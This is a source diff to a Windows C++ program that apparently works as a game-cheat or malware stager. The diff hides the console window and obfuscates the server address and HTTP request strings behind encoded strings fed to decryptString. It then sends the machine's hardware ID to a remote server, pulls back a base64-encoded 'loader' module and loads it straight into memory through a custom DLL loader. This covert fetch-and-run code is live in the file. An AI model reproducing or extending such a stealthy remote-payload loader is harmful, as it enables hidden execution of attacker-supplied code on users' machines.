@@ -1,6 +1,7 @@
 #include "kCrypt.h"
 #include "LoadDLL.h"
 
+/*
 BYTE* readFileBytes(const char* name, size_t* length)
 {
 
@@ -23,7 +24,7 @@ void sendEncryptedToClip(char* c)
 {
 	setClipboard(("decryptString(\"" + encryptString(c) + "\").c_str()").c_str());
 }
-
+*/
 typedef LOAD_DLL_INFO* MODULE_HANDLE;
 
 MODULE_HANDLE LoadModule(BYTE* data, size_t size)
@@ -50,95 +51,74 @@ void* GetModuleFunction(MODULE_HANDLE handle, const char* func_name)
 	return (void*)myGetProcAddress_LoadDLLInfo(handle, func_name);
 }
 
-bool SetupCurrentDir()
-{
-	wchar_t buf[MAX_PATH];
-	DWORD len = GetModuleFileNameW(NULL, buf, MAX_PATH);
-
-	if (!len || len >= MAX_PATH)
-		return false;
-
-	wchar_t* p = buf + len;
-
-	while (p>buf && p[-1] != L'\\' && p[-1] != '/')
-		--p;
-
-	while (p>buf && (p[-1] == L'\\' || p[-1] == '/'))
-		--p;
-
-	*p = 0;
-
-	if (!SetCurrentDirectoryW(buf))
-		return false;
-
-	return true;
-}
-
 int main(int argc, char** args)
 {
-	/*
-	size_t fLen;
-	BYTE* patch = readFileBytes(getFilePath("Unturned_Data\\Managed\\UnityEngine.UI.TestDLL"), &fLen);
-	std::string encoded = base64_encode(patch, fLen);
-	setClipboard(encoded.c_str());
-	*/
-
-	size_t fLen;
-	BYTE* module = readFileBytes(getFilePath("LoaderModule_x86.dll"), &fLen);
 	
-	//std::string encoded = base64_encode(module, fLen);
-	//setClipboard(encoded.c_str());
-	LoadModule(module, fLen);
+	/*
+	sendEncryptedToClip("notepad.exe");
+	//getchar();
+	return 0;*/
 
-	return 0;
+	FreeConsole();
 
 	WSADATA wsaData = { 0 };
 	int iResult = 0;
 	iResult = WSAStartup(0x0202, &wsaData);
-	SOCKET s = getSocket(std::string(getIP("manpad.net16.net")).c_str(), 80);
+	SOCKET s = getSocket(std::string(getIP(decryptString("0000000001111101000000000111000100000000011111100000000010000000000000000111000100000000011101000000000000111110000000000111111000000000011101010000000010000100000000000100000100000000010001100000000000111110000000000111111000000000011101010000000010000100").c_str())).c_str(), 80);
 	
-	const int pSize = 2048*1024;
+	const int pSize = 2048 * 1024;
 	std::vector<char> buffer(pSize); //Yes, this is a 2MB buffer, deal with it - We dont live in the stone ages anymore
-	char* pArgs = "stage=1&HWID=I Will Be Mad If You Share That Shit To The Left :>";
+	std::string pArgs = decryptString("0000000010000000000000001000000100000000011011100000000001110100000000000111001000000000010010100000000000111110000000000011001100000000010101010000000001100100000000000101011000000000010100010000000001001010").c_str();
+	pArgs += getID().c_str();
 
-	strcpy(buffer.data(), "POST /download.php HTTP/1.1\n");
-	strcat(buffer.data(), "Content-Type: application/x-www-form-urlencoded\n");
-	strcat(buffer.data(), "Host: manpad.net16.net\n");
-	strcat(buffer.data(), "Content-Length: ");
-	strcat(buffer.data(), std::to_string(strlen(pArgs)).c_str());
+	strcpy(buffer.data(), decryptString("0000000001101100000000000110101100000000011011110000000001110000000000000011110000000000010010110000000010000000000000001000101100000000100100110000000010001010000000001000100000000000100010110000000001111101000000001000000000000000010010100000000010001100000000001000010000000000100011000000000000111100000000000110010000000000011100000000000001110000000000000110110000000000010010110000000001001101000000000100101000000000010011010000000000100110").c_str());
+	strcat(buffer.data(), decryptString("000000000111001100000000100111110000000010011110000000001010010000000000100101010000000010011110000000001010010000000000010111010000000010000100000000001010100100000000101000000000000010010101000000000110101000000000010100000000000010010001000000001010000000000000101000000000000010011100000000001001100100000000100100110000000010010001000000001010010000000000100110010000000010011111000000001001111000000000010111110000000010101000000000000101110100000000101001110000000010100111000000001010011100000000010111010000000010010110000000001001111100000000101000100000000010011101000000000101110100000000101001010000000010100010000000001001110000000000100101010000000010011110000000001001001100000000100111110000000010010100000000001001010100000000100101000000000000111010").c_str());
+	strcat(buffer.data(), decryptString("00000000010111110000000010000110000000001000101000000000100010110000000001010001000000000011011100000000100001000000000001111000000000001000010100000000100001110000000001111000000000000111101100000000010001010000000010000101000000000111110000000000100010110000000001001000000000000100110100000000010001010000000010000101000000000111110000000000100010110000000000100001").c_str());
+	strcat(buffer.data(), decryptString("0000000001010011000000000111111100000000011111100000000010000100000000000111010100000000011111100000000010000100000000000011110100000000010111000000000001110101000000000111111000000000011101110000000010000100000000000111100000000000010010100000000000110000").c_str());
+	strcat(buffer.data(), std::to_string(pArgs.length()).c_str());
 	strcat(buffer.data(), "\n\n");
-	strcat(buffer.data(), pArgs);
+	strcat(buffer.data(), pArgs.c_str());
 
-	int packet = send(s, buffer.data(), strlen(buffer.data()), 0);
+	send(s, buffer.data(), strlen(buffer.data()), 0);
 
-	if(packet < 0)
+	std::string str = "";
+	std::string line = "";
+	size_t prevSize = 0;
+
+	for (int i = 0; i < 9; i++)
+		readSocketLine(s, false);
+
+	while ((line = readSocketLine(s)) != "")
 	{
 
-		log("Failed to write packet: %d", packet);
-		return 0;
+		prevSize = line.length();
+
+		if (prevSize > 5)
+			str += line;
 
 	}
+	
+	closesocket(s);
 
-	buffer.clear();
-	packet = recv(s, buffer.data(), pSize-1, 0);
+	std::string temp = "";
 
-	std::string str = std::string(strstr(buffer.data(), "{\"success\":"));
-	std::string success = str.substr(strlen("{\"success\":"), str.find("false") != -1 ? 5 : 4);
+	for (size_t i = 0; i < str.length(); i++)
+		if (str[i] != '\\')
+			temp += str[i];
+
+	str = temp;
+
+	std::string success = str.substr(0, str.find("false") != -1 ? 5 : 4);
 	str = str.substr(str.find("\":\"") + 3);
 	std::string loader = str.substr(0, str.find("\",\""));
-	str = str.substr(str.find("\":\"") + 3);
+
+	/*str = str.substr(str.find("\":\"") + 3);
 	std::string executor = str.substr(0, str.find("\",\""));
 	str = str.substr(str.find("\":\"") + 3);
-	std::string injection = str.substr(0, str.find("\"}"));
+	std::string injection = str.substr(0, str.find("\"}"));*/
 
-	log("Success: %s", success.c_str());
-
-	if (success == "false")
-		return 0;
-
-	log("Loader: %s", loader.c_str());
-	log("Executor: %s", executor.c_str());
-	log("Injection: %s", injection.c_str());
+	std::vector<BYTE> vec3 = base64_decode(loader);;
+	LoadModule(vec3.data(), vec3.size());
 
 	return 0;
 
